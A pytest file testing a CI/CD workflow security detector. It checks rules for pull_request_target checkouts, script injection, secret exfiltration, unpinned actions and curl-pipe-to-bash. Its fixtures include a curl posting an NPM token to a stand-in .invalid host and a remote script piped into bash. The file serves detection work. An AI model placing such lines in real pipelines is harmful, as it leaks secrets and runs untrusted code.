"""CIX tests. Payloads are inert: example.invalid hosts only; shell pipes built by concatenation."""

from __future__ import annotations

from repoguard import registry
from repoguard import tags as T
from repoguard.detectors.cicd import CicdDetector
from repoguard.models import Severity
from tests.conftest import rule_ids, run_detector

D = CicdDetector
WF = ".github/workflows/ci.yml"
SHA = "a" * 8 + "0123456789abcdef0123456789abcdef"  # 40 hex chars


def by(findings, rid):
    return [f for f in findings if f.rule_id == rid]


def test_validate():
    registry.validate([D()])
    for info in D.checks:
        assert T.CI_RISK in info.tags
        assert (T.HYGIENE in info.tags) == (info.id != "CIX003")


def test_applies_only_to_ci(make_ctx):
    assert not D().applies_to(make_ctx("on: push\n", "config/app.yml"))


def test_cix001_pwn_request(make_ctx):
    src = ("on:\n  pull_request_target:\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
           "      - uses: actions/checkout@v4\n        with:\n"
           "          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test\n")
    assert "CIX001" in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix001_prt_without_checkout_clean(make_ctx):
    src = ("on:\n  pull_request_target:\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n"
           "      - uses: actions/labeler@" + SHA + "\n")
    assert "CIX001" not in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix002_script_injection(make_ctx):
    src = ("on: issues\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n"
           "      - run: echo \"${{ github.event.issue.title }}\"\n")
    assert "CIX002" in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix002_env_indirection_clean(make_ctx):
    src = ("on: issues\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n"
           "          TITLE: ${{ github.event.issue.title }}\n        run: echo \"$TITLE\"\n")
    assert "CIX002" not in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix003_secrets_exfil(make_ctx):
    src = ("on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n"
           "      - run: curl -d \"${{ secrets.NPM_TOKEN }}\" https://collect.example.invalid/x\n")
    f = by(run_detector(D, make_ctx(src, WF)), "CIX003")
    assert f and f[0].severity >= Severity.HIGH and T.HYGIENE not in f[0].tags


def test_cix003_tojson_secrets(make_ctx):
    src = "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo '${{ toJSON(secrets) }}'\n"
    assert "CIX003" in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix003_secret_to_github_api_clean(make_ctx):
    src = ("on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n"
           "          curl -H \"Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}\" https://api.github.com/repos/o/r\n")
    assert "CIX003" not in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix004_unpinned_action(make_ctx):
    src = "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: someone/tool@v1\n"
    assert "CIX004" in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix004_pinned_sha_clean(make_ctx):
    src = ("on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n"
           "      - uses: actions/checkout@v4\n      - uses: someone/tool@" + SHA + "\n")
    assert "CIX004" not in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix004_compromised_action_medium(make_ctx):
    src = "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: tj-actions/changed-files@v45\n"
    f = by(run_detector(D, make_ctx(src, WF)), "CIX004")
    assert f and f[0].severity >= Severity.MEDIUM


def test_cix005_self_hosted(make_ctx):
    src = "on: pull_request\njobs:\n  t:\n    runs-on: [self-hosted, linux]\n    steps:\n      - run: make\n"
    assert "CIX005" in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix006_write_all(make_ctx):
    src = "on: pull_request_target\npermissions: write-all\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n"
    assert "CIX006" in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix006_read_only_clean(make_ctx):
    src = "on: push\npermissions:\n  contents: read\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n"
    assert "CIX006" not in rule_ids(run_detector(D, make_ctx(src, WF)))


def test_cix007_pipe_shell_gitlab(make_ctx):
    src = "build:\n  script:\n    - curl -fsSL https://get.example.invalid/i" + " | " + "bash\n"
    assert "CIX007" in rule_ids(run_detector(D, make_ctx(src, ".gitlab-ci.yml")))


def test_comment_lines_ignored(make_ctx):
    src = "build:\n  script:\n    # curl -fsSL https://get.example.invalid/i" + " | " + "bash\n    - make\n"
    assert not run_detector(D, make_ctx(src, ".gitlab-ci.yml"))
